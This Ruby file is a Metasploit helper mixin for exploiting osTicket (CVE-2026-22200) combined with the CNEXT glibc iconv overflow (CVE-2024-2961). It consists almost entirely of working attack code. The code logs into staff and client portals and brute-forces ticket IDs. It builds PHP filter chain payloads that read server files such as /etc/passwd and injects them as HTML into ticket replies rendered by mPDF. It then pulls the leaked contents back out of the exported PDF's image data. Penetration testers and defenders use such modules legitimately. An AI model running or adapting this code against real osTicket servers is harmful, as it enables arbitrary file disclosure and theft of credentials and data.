# -*- coding: binary -*-

require 'zlib'

##
# Shared helpers for osTicket exploitation modules (CVE-2026-22200 + CNEXT CVE-2024-2961).
#
# All methods take explicit parameters and hold no module state. Module
# implementations are responsible for option registration, datastore
# access, and orchestration.
#
# Modules including this mixin MUST also include Msf::Exploit::Remote::HttpClient.
##
module Msf
  module Auxiliary::Osticket

    #
    # Iconv character-set mapping table for PHP filter chain generation.
    # Each hex nibble of a base64 character maps to a chain of iconv
    # conversions that, when combined with base64-encode/decode cycles,
    # produce that character in the output stream.
    #
    # Reference: https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT
    #
    ICONV_MAPPINGS = {
      '30' => 'convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.iconv.ISO6937.EUC-JP-MS|convert.iconv.EUCKR.UCS-4LE',
      '31' => 'convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4',
      '32' => 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921',
      '33' => 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE',
      '34' => 'convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE',
      '35' => 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.GBK.UTF-8|convert.iconv.IEC_P27-1.UCS-4LE',
      '36' => 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2',
      '37' => 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4',
      '38' => 'convert.iconv.JS.UTF16|convert.iconv.L6.UTF-16',
      '39' => 'convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB',
      '2f' => 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4',
      '41' => 'convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213',
      '42' => 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000',
      '43' => 'convert.iconv.CN.ISO2022KR',
      '44' => 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213',
      '45' => 'convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT',
      '46' => 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB',
      '47' => 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90',
      '48' => 'convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213',
      '49' => 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213',
      '4a' => 'convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4',
      '4b' => 'convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE',
      '4c' => 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC',
      '4d' => 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T',
      '4e' => 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4',
      '4f' => 'convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775',
      '50' => 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB',
      '51' => 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2',
      '52' => 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4',
      '53' => 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS',
      '54' => 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103',
      '55' => 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943',
      '56' => 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB',
      '57' => 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936',
      '58' => 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932',
      '59' => 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361',
      '5a' => 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16',
      '61' => 'convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE',
      '62' => 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE',
      '63' => 'convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2',
      '64' => 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5',
      '65' => 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937',
      '66' => 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213',
      '67' => 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8',
      '68' => 'convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE',
      '69' => 'convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000',
      '6a' => 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16',
      '6b' => 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2',
      '6c' => 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE',
      '6d' => 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949',
      '6e' => 'convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61',
      '6f' => 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE',
      '70' => 'convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4',
      '71' => 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2',
      '72' => 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101',
      '73' => 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90',
      '74' => 'convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS',
      '75' => 'convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61',
      '76' => 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO_6937-2:1983.R9|convert.iconv.OSF00010005.IBM-932',
      '77' => 'convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE',
      '78' => 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS',
      '79' => 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT',
      '7a' => 'convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937'
    }.freeze

    # CNEXT (CVE-2024-2961) constants
    CNEXT_HEAP_SIZE = 2 * 1024 * 1024
    CNEXT_BUG = "\xe5\x8a\x84".b # UTF-8 encoding of 劄 - triggers glibc iconv overflow
    CNEXT_OFFSET_FREE_SLOT  = 0x20  # zend_mm_heap->free_slot offset (x86_64)
    CNEXT_OFFSET_CUSTOM_HEAP = 0x168 # zend_mm_heap->custom_heap offset (x86_64)
    CNEXT_CHUNK_SIZE = 0x100 # Default chunk size used in CNEXT heap manipulation

    # ─────────────────────────────────────────────────────────
    # Detection
    # ─────────────────────────────────────────────────────────

    # Checks whether an HTTP response belongs to an osTicket installation.
    #
    # @param response [Rex::Proto::Http::Response] HTTP response
    # @return [Boolean]
    def is_osticket?(response)
      unless response
        vprint_error('is_osticket?: No response received (nil)')
        return false
      end
      vprint_status("is_osticket?: Response code=#{response.code}, body length=#{response.body.to_s.length}")
      unless response.code == 200
        vprint_error("is_osticket?: Non-200 response code: #{response.code}")
        return false
      end

      found = response.body.match?(/osTicket/i)
      vprint_status("is_osticket?: osTicket signature #{found ? 'FOUND' : 'NOT found'} in response body")
      found
    end

    # ─────────────────────────────────────────────────────────
    # CSRF Token Extraction
    # ─────────────────────────────────────────────────────────

    # Extracts the __CSRFToken__ hidden field value from an osTicket HTML page.
    # Handles name-before-value, value-before-name, and single/double quotes.
    #
    # @param html [String] HTML response body
    # @return [String, nil] CSRF token value, or nil if not found
    def extract_csrf_token(html)
      vprint_status("extract_csrf_token: Searching HTML (#{html.to_s.length} bytes) for __CSRFToken__")
      [
        /name="__CSRFToken__"[^>]*value="([^"]+)"/,
        /value="([^"]+)"[^>]*name="__CSRFToken__"/,
        /name='__CSRFToken__'[^>]*value='([^']+)'/,
        /value='([^']+)'[^>]*name='__CSRFToken__'/
      ].each do |pattern|
        match = html.match(pattern)
        if match
          vprint_good("extract_csrf_token: Found token=#{match[1]}")
          return match[1]
        end
      end
      vprint_error('extract_csrf_token: No CSRF token found in HTML')
      nil
    end

    # ─────────────────────────────────────────────────────────
    # Authentication
    # ─────────────────────────────────────────────────────────

    # Authenticates to the osTicket staff control panel (/scp/).
    #
    # @param base_uri [String] base path to osTicket (e.g. '/')
    # @param username [String] staff username
    # @param password [String] staff password
    # @return [String, nil] session cookies on success, nil on failure
    def osticket_login_scp(base_uri, username, password)
      login_uri = normalize_uri(base_uri, 'scp', 'login.php')
      vprint_status("osticket_login_scp: GET #{login_uri}")

      res = send_request_cgi('method' => 'GET', 'uri' => login_uri)
      unless res
        vprint_error('osticket_login_scp: No response from GET request (nil)')
        return nil
      end
      vprint_status("osticket_login_scp: GET response code=#{res.code}, cookies=#{res.get_cookies}")
      unless res.code == 200
        vprint_error("osticket_login_scp: Expected 200, got #{res.code}")
        return nil
      end

      csrf = extract_csrf_token(res.body)
      unless csrf
        vprint_error('osticket_login_scp: No CSRF token found, cannot POST login')
        return nil
      end

      cookies_for_post = res.get_cookies
      vprint_status("osticket_login_scp: POST #{login_uri} with userid=#{username}")
      res = send_request_cgi(
        'method' => 'POST',
        'uri' => login_uri,
        'cookie' => cookies_for_post,
        'vars_post' => {
          '__CSRFToken__' => csrf,
          'userid' => username,
          'passwd' => password
        }
      )
      unless res
        vprint_error('osticket_login_scp: No response from POST request (nil)')
        return nil
      end
      vprint_status("osticket_login_scp: POST response code=#{res.code}, url=#{res.headers['Location']}, body contains userid=#{res.body.downcase.include?('userid')}")

      if res.code == 302
        post_cookies = res.get_cookies
        # 302 responses may not set new cookies; fall back to the GET cookies
        # which already contain the authenticated OSTSESSID
        session_cookies = post_cookies.empty? ? cookies_for_post : post_cookies

        # Follow the redirect to complete the login flow (Python requests.Session
        # does this automatically with allow_redirects=True)
        location = res.headers['Location']
        if location
          redirect_uri = location.start_with?('http') ? URI.parse(location).path : location
          vprint_status("osticket_login_scp: Following 302 redirect to #{redirect_uri}")
          redir_res = send_request_cgi('method' => 'GET', 'uri' => redirect_uri, 'cookie' => session_cookies)
          if redir_res
            vprint_status("osticket_login_scp: Redirect response code=#{redir_res.code}, body=#{redir_res.body.to_s.length} bytes")
            # If the redirect target sets additional cookies, use them
            redir_cookies = redir_res.get_cookies
            session_cookies = redir_cookies unless redir_cookies.empty?
          end
        end

        vprint_good("osticket_login_scp: Login SUCCESS, cookies=#{session_cookies}")
        return session_cookies
      end

      if res.code == 200 && !res.body.downcase.include?('userid')
        vprint_good("osticket_login_scp: Login SUCCESS (200 without login form), cookies=#{cookies_for_post}")
        return cookies_for_post
      end

      vprint_error('osticket_login_scp: Login FAILED (still see login form)')
      nil
    end

    # Authenticates to the osTicket client portal.
    #
    # @param base_uri [String] base path to osTicket (e.g. '/')
    # @param username [String] client email
    # @param password [String] client password
    # @param login_path [String] login path (default: 'login.php')
    #
    # @return [String, nil] session cookies on success, nil on failure
    #
    def osticket_login_client(base_uri, username, password, login_path = 'login.php')
      login_uri = normalize_uri(base_uri, login_path)
      vprint_status("osticket_login_client: GET #{login_uri}")

      res = send_request_cgi('method' => 'GET', 'uri' => login_uri)
      unless res
        vprint_error('osticket_login_client: No response from GET request (nil)')
        return nil
      end
      vprint_status("osticket_login_client: GET response code=#{res.code}, cookies=#{res.get_cookies}")
      unless res.code == 200
        vprint_error("osticket_login_client: Expected 200, got #{res.code}")
        return nil
      end

      csrf = extract_csrf_token(res.body)
      unless csrf
        vprint_error('osticket_login_client: No CSRF token found, cannot POST login')
        return nil
      end

      cookies_for_post = res.get_cookies
      vprint_status("osticket_login_client: POST #{login_uri} with luser=#{username}")
      res = send_request_cgi(
        'method' => 'POST',
        'uri' => login_uri,
        'cookie' => cookies_for_post,
        'vars_post' => {
          '__CSRFToken__' => csrf,
          'luser' => username,
          'lpasswd' => password
        }
      )
      unless res
        vprint_error('osticket_login_client: No response from POST request (nil)')
        return nil
      end
      vprint_status("osticket_login_client: POST response code=#{res.code}, body contains luser=#{res.body.include?('luser')}")

      if res.code == 302
        post_cookies = res.get_cookies
        # 302 responses may not set new cookies; fall back to the GET cookies
        # which already contain the authenticated OSTSESSID
        session_cookies = post_cookies.empty? ? cookies_for_post : post_cookies

        # Follow the redirect to complete the login flow (Python requests.Session
        # does this automatically with allow_redirects=True)
        location = res.headers['Location']
        if location
          redirect_uri = location.start_with?('http') ? URI.parse(location).path : location
          vprint_status("osticket_login_client: Following 302 redirect to #{redirect_uri}")
          redir_res = send_request_cgi('method' => 'GET', 'uri' => redirect_uri, 'cookie' => session_cookies)
          if redir_res
            vprint_status("osticket_login_client: Redirect response code=#{redir_res.code}, body=#{redir_res.body.to_s.length} bytes")
            # If the redirect target sets additional cookies, use them
            redir_cookies = redir_res.get_cookies
            session_cookies = redir_cookies unless redir_cookies.empty?
          end
        end

        vprint_good("osticket_login_client: Login SUCCESS, cookies=#{session_cookies}")
        return session_cookies
      end

      if res.code == 200 && !res.body.include?('luser')
        vprint_good("osticket_login_client: Login SUCCESS (200 without login form), cookies=#{cookies_for_post}")
        return cookies_for_post
      end

      vprint_error('osticket_login_client: Login FAILED (still see login form)')
      nil
    end

    # ─────────────────────────────────────────────────────────
    # Ticket Operations
    # ─────────────────────────────────────────────────────────

    # Resolves a user-visible ticket number to the internal numeric ticket ID
    # used in tickets.php?id= parameters.
    #
    # @param base_uri      [String] base path to osTicket
    # @param prefix        [String] portal prefix ('/scp' or '')
    # @param ticket_number [String] visible ticket number (e.g. '978554')
    # @param cookies       [String] session cookies
    # @return [String, nil] internal ticket ID or nil
    def find_ticket_id(base_uri, prefix, ticket_number, cookies, max_id)
      tickets_uri = normalize_uri(base_uri, prefix, 'tickets.php')
      vprint_status("find_ticket_id: GET #{tickets_uri} (looking for ticket ##{ticket_number})")
      vprint_status("find_ticket_id: Using cookies=#{cookies}")

      res = send_request_cgi(
        'method' => 'GET',
        'uri' => tickets_uri,
        'cookie' => cookies
      )
      unless res
        vprint_error('find_ticket_id: No response from ticket listing (nil)')
        return nil
      end
      vprint_status("find_ticket_id: Ticket listing response code=#{res.code}, body=#{res.body.to_s.length} bytes")
      vprint_status("find_ticket_id: Body:\n#{res.body}")
      return nil unless res.code == 200

      match = res.body.match(/tickets\.php\?id=(\d+)[^>]*>.*?#?#{Regexp.escape(ticket_number.to_s)}/m)
      if match
        vprint_good("find_ticket_id: Found ticket ID=#{match[1]} from listing page")
        return match[1]
      end
      vprint_status("find_ticket_id: Ticket ##{ticket_number} not found in listing, trying brute-force IDs 1-#{max_id}...")

      # Brute-force first N IDs as fallback
      (1..max_id).each do |tid|
        vprint_status("find_ticket_id: Trying id=#{tid}")
        res = send_request_cgi(
          'method' => 'GET',
          'uri' => tickets_uri,
          'cookie' => cookies,
          'vars_get' => { 'id' => tid.to_s }
        )
        if res&.code == 200 && res.body.include?(ticket_number.to_s)
          vprint_good("find_ticket_id: Found ticket ##{ticket_number} at id=#{tid}")
          return tid.to_s
        end
      end

      vprint_error("find_ticket_id: Could not locate ticket ##{ticket_number}")
      nil
    end

    # Submits an HTML payload as a ticket reply. The payload is injected into
    # the reply body and will be rendered by mPDF when the ticket PDF is exported.
    #
    # @param base_uri     [String] base path to osTicket
    # @param prefix       [String] portal prefix ('/scp' or '')
    # @param ticket_id    [String] internal ticket ID
    # @param html_content [String] HTML payload to inject
    # @param cookies      [String] session cookies
    # @return [Boolean] true if the reply was accepted
    def submit_ticket_reply(base_uri, prefix, ticket_id, html_content, cookies)
      ticket_uri = normalize_uri(base_uri, prefix, 'tickets.php')
      vprint_status("submit_ticket_reply: GET #{ticket_uri}?id=#{ticket_id} to fetch CSRF token")

      res = send_request_cgi(
        'method' => 'GET',
        'uri' => ticket_uri,
        'cookie' => cookies,
        'vars_get' => { 'id' => ticket_id }
      )
      unless res
        vprint_error('submit_ticket_reply: No response from ticket page (nil)')
        return false
      end
      vprint_status("submit_ticket_reply: GET response code=#{res.code}, body=#{res.body.to_s.length} bytes")
      return false unless res.code == 200

      csrf = extract_csrf_token(res.body)
      unless csrf
        vprint_error('submit_ticket_reply: No CSRF token found on ticket page')
        return false
      end

      # SCP uses 'response' textarea, client portal uses 'message'
      textarea_name = detect_reply_textarea(res.body, prefix)
      vprint_status("submit_ticket_reply: Using textarea field '#{textarea_name}', payload=#{html_content.length} bytes")

      vprint_status("submit_ticket_reply: POST #{ticket_uri} with a=reply, id=#{ticket_id}")
      res = send_request_cgi(
        'method' => 'POST',
        'uri' => ticket_uri,
        'cookie' => cookies,
        'vars_post' => {
          '__CSRFToken__' => csrf,
          'id' => ticket_id,
          'a' => 'reply',
          textarea_name => html_content
        }
      )
      unless res
        vprint_error('submit_ticket_reply: No response from POST reply (nil)')
        return false
      end
      vprint_status("submit_ticket_reply: POST response code=#{res.code}, body=#{res.body.to_s.length} bytes")

      # A 302 redirect after POST indicates the reply was accepted (osTicket redirects on success)
      if res.code == 302
        vprint_good('submit_ticket_reply: Got 302 redirect - reply accepted')
        return true
      end

      success = %w[reply\ posted posted\ successfully message\ posted response\ posted].any? do |indicator|
        res.body.downcase.include?(indicator)
      end
      vprint_status("submit_ticket_reply: Success indicators found=#{success}")
      success
    end

    # Downloads the PDF export of a ticket. Tries multiple known URL patterns.
    #
    # @param base_uri  [String] base path to osTicket
    # @param prefix    [String] portal prefix ('/scp' or '')
    # @param ticket_id [String] internal ticket ID
    # @param cookies   [String] session cookies
    # @return [String, nil] raw PDF bytes, or nil on failure
    def download_ticket_pdf(base_uri, prefix, ticket_id, cookies, max_redirects = 3)
      base = normalize_uri(base_uri, prefix, 'tickets.php')
      vprint_status("download_ticket_pdf: Trying PDF export from #{base}")

      [
        { 'a' => 'print', 'id' => ticket_id },
        { 'a' => 'print', 'id' => ticket_id, 'pdf' => 'true' },
        { 'id' => ticket_id, 'a' => 'print' }
      ].each do |params|
        query = params.map { |k, v| "#{k}=#{v}" }.join('&')
        vprint_status("download_ticket_pdf: GET #{base}?#{query}")
        res = send_request_cgi(
          'method' => 'GET',
          'uri' => base,
          'cookie' => cookies,
          'vars_get' => params
        )
        unless res
          vprint_error("download_ticket_pdf: No response (nil) for params=#{params}")
          next
        end

        # Follow 302 redirects (osTicket may redirect to the actual PDF URL)
        redirect_limit = max_redirects
        while res.code == 302 && redirect_limit > 0
          location = res.headers['Location']
          break unless location

          redirect_uri = location.start_with?('http') ? URI.parse(location).path : location
          vprint_status("download_ticket_pdf: Following 302 redirect to #{redirect_uri}")
          res = send_request_cgi(
            'method' => 'GET',
            'uri' => redirect_uri,
            'cookie' => cookies
          )
          break unless res

          redirect_limit -= 1
        end

        content_type = res.headers['Content-Type'] || ''
        magic = res.body[0, 4].to_s
        vprint_status("download_ticket_pdf: Response code=#{res.code}, Content-Type=#{content_type}, magic=#{magic.inspect}, size=#{res.body.length}")

        if content_type.start_with?('application/pdf') || magic == '%PDF'
          vprint_good("download_ticket_pdf: Got PDF (#{res.body.length} bytes)")
          return res.body
        else
          vprint_warning("download_ticket_pdf: Not a PDF response")
        end
      end

      vprint_error('download_ticket_pdf: All PDF URL patterns failed')
      nil
    end

    # ─────────────────────────────────────────────────────────
    # PHP Filter Chain Generation
    # ─────────────────────────────────────────────────────────

    # Builds a minimal 24-bit BMP file header used as a carrier for
    # exfiltrated data. mPDF renders it as an image whose pixel data
    # contains the leaked file content after the ISO-2022-KR escape marker.
    #
    # @param width  [Integer] BMP width in pixels (default 15000)
    # @param height [Integer] BMP height in pixels (default 1)
    # @return [String] raw BMP header bytes
    def generate_bmp_header(width = 15000, height = 1)
      header = "BM:\x00\x00\x00\x00\x00\x00\x006\x00\x00\x00(\x00\x00\x00".b
      header << [width].pack('V')
      header << [height].pack('V')
      header << "\x01\x00\x18\x00\x00\x00\x00\x00\x04\x00\x00\x00".b
      header << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".b
      header
    end

    # Generates a PHP filter chain URI that reads a target file and prepends
    # a BMP header so the result embeds as an image in the PDF.
    #
    # @param file_path [String] remote file path to read
    # @param encoding  [String] 'plain', 'b64', or 'b64zlib'
    # @return [String] the php://filter/... URI
    def generate_php_filter_payload(file_path, encoding = 'plain')
      b64_payload = Rex::Text.encode_base64(generate_bmp_header)

      filters = 'convert.iconv.UTF8.CSISO2022KR|'
      filters << 'convert.base64-encode|'
      filters << 'convert.iconv.UTF8.UTF7|'

      b64_payload.reverse.each_char do |c|
        hex_char = c.ord.to_s(16)
        mapping = ICONV_MAPPINGS[hex_char]
        next unless mapping

        filters << mapping << '|'
        filters << 'convert.base64-decode|'
        filters << 'convert.base64-encode|'
        filters << 'convert.iconv.UTF8.UTF7|'
      end

      filters << 'convert.base64-decode'

      case encoding
      when 'b64'
        filters = 'convert.base64-encode|' + filters
      when 'b64zlib'
        filters = 'zlib.deflate|convert.base64-encode|' + filters
      end

      "php://filter/#{filters}/resource=#{file_path}"
    end

    # URL-encodes a string, forcing uppercase ASCII letters to percent-encoded
    # form. Necessary because osTicket/mPDF/htmLawed lowercases unencoded path
    # components, breaking case-sensitive iconv charset names.
    #
    # @param input_string [String] string to encode
    # @return [String] URL-encoded string
    def quote_with_forced_uppercase(input_string)
      safe_chars = ('a'..'z').to_a + ('0'..'9').to_a + ['_', '.', '-', '~']
      input_string.chars.map do |char|
        if char >= 'A' && char <= 'Z'
          format('%%%X', char.ord)
        elsif safe_chars.include?(char)
          char
        else
          Rex::Text.uri_encode(char)
        end
      end.join
    end

    # Generates the HTML payload for injection into an osTicket ticket.
    # Each file to read becomes a <li> element whose list-style-image CSS
    # property points to a PHP filter chain URI, triggering mPDF to process it.
    #
    # @param file_specs [Array<String>, Array<Hash>] file paths to read.
    #   Strings may include encoding suffix: "/etc/passwd,b64zlib".
    #   Hashes should have :path and optionally :encoding keys.
    # @param is_reply [Boolean] true for ticket reply, false for ticket creation
    # @return [String] HTML payload
    def generate_ticket_payload(file_specs, is_reply = true)
      sep = is_reply ? '&#38;&#35;&#51;&#52;' : '&#34'

      payloads = Array(file_specs).map do |spec|
        if spec.is_a?(Hash)
          generate_php_filter_payload(spec[:path], spec[:encoding] || 'plain')
        elsif spec.include?(',')
          path, enc = spec.split(',', 2)
          enc = 'plain' unless %w[plain b64 b64zlib].include?(enc)
          generate_php_filter_payload(path, enc)
        else
          generate_php_filter_payload(spec)
        end
      end

      html = '<ul>'
      payloads.each do |p|
        html << "<li style=\"list-style-image:url#{sep}(#{quote_with_forced_uppercase(p)})\">listitem</li>\n"
      end
      html << '</ul>'
      html
    end

    # Wraps a raw PHP filter chain URI (e.g. a CNEXT payload) in the
    # osTicket HTML injection format for delivery via ticket reply.
    #
    # @param filter_uri [String] php://filter/... URI
    # @param is_reply   [Boolean] true for ticket reply payload
    # @return [String] HTML payload
    def wrap_filter_as_ticket_payload(filter_uri, is_reply = true)
      sep = is_reply ? '&#38;&#35;&#51;&#52;' : '&#34'
      "<ul><li style=\"list-style-image:url#{sep}(#{quote_with_forced_uppercase(filter_uri)})\">listitem</li></ul>"
    end

    # ─────────────────────────────────────────────────────────
    # PDF / BMP Data Extraction Pipeline
    # ─────────────────────────────────────────────────────────

    # Extracts exfiltrated file contents from a PDF generated by mPDF.
    #
    # mPDF embeds our BMP payload as a PDF image XObject, converting the
    # pixel data from BMP's BGR byte order to PDF's RGB byte order. To find
    # the ISO-2022-KR marker, we must convert the image data back to BGR.
    #
    # This mirrors what the Python PoC does with PyMuPDF + Pillow:
    #   pix = fitz.Pixmap(pdf_doc, xref)       # extract image (RGB)
    #   pil_image.save(bmp_buffer, "BMP")       # convert to BMP (BGR)
    #   extract_data_from_bmp(bmp_data)          # find marker in BGR data
    #
    # @param pdf_data [String] raw PDF bytes
    # @return [Array<String>] array of extracted file contents
    def extract_files_from_pdf(pdf_data)
      vprint_status("extract_files_from_pdf: Processing PDF (#{pdf_data.length} bytes)")
      results = []

      # Primary: Extract image XObjects, swap RGB→BGR, search for marker
      image_streams = extract_pdf_image_streams(pdf_data)
      vprint_status("extract_files_from_pdf: Found #{image_streams.length} image XObject streams")

      image_streams.each_with_index do |img_data, idx|
        # Swap RGB→BGR to restore original BMP pixel byte order
        bgr_data = swap_rgb_bgr(img_data)
        vprint_status("extract_files_from_pdf: Image ##{idx}: #{img_data.length} bytes, swapped to BGR")

        content = extract_data_from_bmp_stream(bgr_data)
        next unless content && !content.empty?

        clean = content.sub(/\x00+\z/, ''.b)
        pad_idx = clean.index('@C>=='.b)
        clean = clean[0...pad_idx] if pad_idx && pad_idx > 0
        unless clean.empty?
          vprint_good("extract_files_from_pdf: Image ##{idx} yielded #{clean.length} bytes of extracted data")
          results << clean
        end
      end

      unless results.empty?
        vprint_status("extract_files_from_pdf: Total extracted files: #{results.length}")
        return results
      end

      # Fallback: scan all streams directly (for edge cases where BGR swap isn't needed)
      streams = extract_pdf_streams(pdf_data)
      vprint_status("extract_files_from_pdf: Fallback - scanning #{streams.length} raw streams")

      streams.each_with_index do |stream, idx|
        content = extract_data_from_bmp_stream(stream)
        next unless content && !content.empty?

        clean = content.sub(/\x00+\z/, ''.b)
        pad_idx = clean.index('@C>=='.b)
        clean = clean[0...pad_idx] if pad_idx && pad_idx > 0
        unless clean.empty?
          vprint_good("extract_files_from_pdf: Stream ##{idx} yielded #{clean.length} bytes of extracted data")
          results << clean
        end
      end

      vprint_status("extract_files_from_pdf: Total extracted files: #{results.length}")
      results
    end

    # Finds image XObject streams in the PDF and returns their decompressed data.
    # Parses the raw PDF to locate objects with /Subtype /Image, then extracts
    # and decompresses their stream content.
    #
    # @param pdf_data [String] raw PDF bytes
    # @return [Array<String>] array of decompressed image stream data
    def extract_pdf_image_streams(pdf_data)
      pdf_data = pdf_data.dup.force_encoding('ASCII-8BIT')
      images = []

      # Find all object start positions
      obj_starts = []
      pdf_data.scan(/\d+\s+\d+\s+obj\b/) do
        obj_starts << Regexp.last_match.begin(0)
      end

      obj_starts.each_with_index do |obj_start, i|
        # Determine object boundary (up to next obj or end of file)
        obj_end = i + 1 < obj_starts.length ? obj_starts[i + 1] : pdf_data.length
        obj_data = pdf_data[obj_start...obj_end]

        # Only process image XObjects
        next unless obj_data.match?(/\/Subtype\s*\/Image/)

        # Find stream data within this object
        stream_idx = obj_data.index("stream")
        next unless stream_idx

        # Skip past "stream" keyword + newline delimiter
        data_start = stream_idx + 6
        data_start += 1 if data_start < obj_data.length && obj_data[data_start] == "\r".b
        data_start += 1 if data_start < obj_data.length && obj_data[data_start] == "\n".b

        endstream_idx = obj_data.index('endstream', data_start)
        next unless endstream_idx

        stream_data = obj_data[data_start...endstream_idx]
        stream_data = stream_data.sub(/\r?\n?\z/, '')

        # Decompress if FlateDecode filter is applied
        if obj_data.match?(/\/Filter\s*\/FlateDecode/) || obj_data.match?(/\/Filter\s*\[.*?\/FlateDecode/)
          begin
            decompressed = Zlib::Inflate.inflate(stream_data)
          rescue Zlib::DataError, Zlib::BufError
            decompressed = stream_data
          end
        else
          decompressed = stream_data
        end

        vprint_status("extract_pdf_image_streams: Found image object (#{decompressed.length} bytes decompressed)")
        images << decompressed
      end

      images
    end

